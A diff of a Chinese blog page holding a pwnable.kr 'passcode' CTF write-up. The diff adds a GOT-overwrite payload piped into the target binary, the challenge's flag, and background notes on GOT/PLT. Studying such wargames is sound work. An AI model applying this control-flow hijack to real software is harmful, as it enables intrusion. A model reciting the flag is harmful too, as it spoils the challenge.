@@ -20,7 +20,7 @@
 <meta property="og:image" content="http://imglf6.nosdn.127.net/img/S0ZyYTZNbTNwamZvSEdUR09WeTVGZzd4L2RZTXl3NGF6SWFqN2krT2F2bjg3T2Q3OGVmNGFRPT0.png?imageView&thumbnail=500x0&quality=96&stripmeta=0">
 <meta property="og:image" content="http://imglf4.nosdn.127.net/img/S0ZyYTZNbTNwamZvSEdUR09WeTVGdE1QdzRPRGZKUDJEaHZEYmxaa205bEkySlo5a3c3dUd3PT0.png?imageView&thumbnail=500x0&quality=96&stripmeta=0">
 <meta property="og:image" content="http://imglf4.nosdn.127.net/img/S0ZyYTZNbTNwamZvSEdUR09WeTVGdnE0aGFBSEdVN0tGSkhpNVNHeW44MnU1UnBzT1UvTmpRPT0.png?imageView&thumbnail=500x0&quality=96&stripmeta=0">
-<meta property="og:updated_time" content="2018-06-27T11:25:58.567Z">
+<meta property="og:updated_time" content="2018-06-27T12:02:28.536Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwnable 笔记 Toddler's Bottle - passcode">
 <meta name="twitter:description" content="简单的got覆写">
@@ -310,8 +310,15 @@
 <p><img src="http://imglf4.nosdn.127.net/img/S0ZyYTZNbTNwamZvSEdUR09WeTVGdnE0aGFBSEdVN0tGSkhpNVNHeW44MnU1UnBzT1UvTmpRPT0.png?imageView&amp;thumbnail=500x0&amp;quality=96&amp;stripmeta=0" alt="这里写图片描述"></p>
 <p>我们们可以把 name 的最后四个字节写成 plt 中 printf fflush exit函数的地址，然后在输入 passcode1 时输入调用 system 函数的地址，即 0x080485e3<br>注意函数调用前还有给参数赋值等初始化操作</p>
 <p>又因为scanf的时候用的%d所以要把system的地址转换成十进制</p>
-<p>payload = a’*96 +‘\x00\xa0\x04\x08’+’134514147\n</p>
-<p>python -c “print ‘A’ * 96 + ‘\x00\xa0\x04\x08’ + ‘134514147\n’” | ./passcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload = a’*96 +‘\x00\xa0\x04\x08’+’134514147\n</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &quot;print &apos;A&apos; * 96 + &apos;\x00\xa0\x04\x08&apos; + &apos;134514147\n&apos;&quot; | ./passcode</div></pre></td></tr></table></figure>
+<p>FLAG: Sorry mom.. I got confused about scanf usage :(</p>
+<hr>
+<p><strong>科普<br>0x01.GOT和PLT表简介</strong></p>
+<p>GOT表：<br>概念：每一个外部定义的符号在全局偏移表（Global offset Table ）中有相应的条目，GOT位于ELF的数据段中，叫做GOT段。<br>作用：把位置无关的地址计算重定位到一个绝对地址。程序首次调用某个库函数时，运行时连接编辑器（rtld）找到相应的符号，并将它重定位到GOT之后每次调用这个函数都会将控制权直接转向那个位置，而不再调用rtld。</p>
+<p>PLT：过程连接表，一个PLT条目对应一个GOT条目<br>当main函数开始，会请求plt中这个函数的对应GOT地址，如果第一次调用那么GOT会重定位到plt，并向栈中压入一个偏移，程序的执行回到_init()函数，rtld得以调用就可以定位printf的符号地址，第二次运行程序再次调用这个函数时程序跳入plt，对应的GOT入口点就是真实的函数入口地址。<br>动态连接器并不会把动态库函数在编译的时候就包含到ELF文件中,仅仅是在这个ELF被加载的时候,才会把那些动态函库数代码加载进来,之前系统只会在ELF文件中的GOT中保留一个调用地址。<br><a href="http://www.programlife.net/linux-got-plt.html" target="_blank" rel="external">http://www.programlife.net/linux-got-plt.html</a><br><a href="http://blog.csdn.net/lmh12506/article/details/6801630" target="_blank" rel="external">http://blog.csdn.net/lmh12506/article/details/6801630</a><br>这里面有详细的介绍linux的got和plt</p>
+<p>0x02.gdb常用调试指令</p>
+<p><a href="https://deepzz.com/post/gdb-debug.html" target="_blank" rel="external">https://deepzz.com/post/gdb-debug.html</a></p>
 <p>参考:<br><a href="http://www.cnblogs.com/p4nda/p/7122094.html" target="_blank" rel="external">http://www.cnblogs.com/p4nda/p/7122094.html</a><br><a href="https://blog.csdn.net/qq_20307987/article/details/51303824" target="_blank" rel="external">https://blog.csdn.net/qq_20307987/article/details/51303824</a><br><a href="https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/" target="_blank" rel="external">https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/</a><br><a href="https://www.jianshu.com/p/886a7b8c2ad5" target="_blank" rel="external">https://www.jianshu.com/p/886a7b8c2ad5</a><br><a href="https://www.google.com/search?q=got%E8%A1%A8%E8%A6%86%E5%86%99+ctf&amp;oq=got%E8%A1%A8%E8%A6%86%E5%86%99+ctf&amp;aqs=chrome..69i57.14403j0j7&amp;sourceid=chrome&amp;ie=UTF-8" target="_blank" rel="external">https://www.google.com/search?q=got%E8%A1%A8%E8%A6%86%E5%86%99+ctf&amp;oq=got%E8%A1%A8%E8%A6%86%E5%86%99+ctf&amp;aqs=chrome..69i57.14403j0j7&amp;sourceid=chrome&amp;ie=UTF-8</a></p>
 
       
@@ -371,7 +378,7 @@
         <p><span>本文标题:</span><a href="/2018/06/27/pwnable 笔记 Toddler's Bottle - passcode/">pwnable 笔记 Toddler&#39;s Bottle - passcode</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 arbitgod 的个人博客">arbitgod</a></p>
         <p><span>发布时间:</span>2018年06月27日 - 19时24分</p>
-        <p><span>最后更新:</span>2018年06月27日 - 19时25分</p>
+        <p><span>最后更新:</span>2018年06月27日 - 20时02分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/06/27/pwnable 笔记 Toddler's Bottle - passcode/" title="pwnable 笔记 Toddler&#39;s Bottle - passcode">http://yoursite.com/2018/06/27/pwnable 笔记 Toddler&#39;s Bottle - passcode/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/06/27/pwnable 笔记 Toddler&#39;s Bottle - passcode/　　作者: arbitgod" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
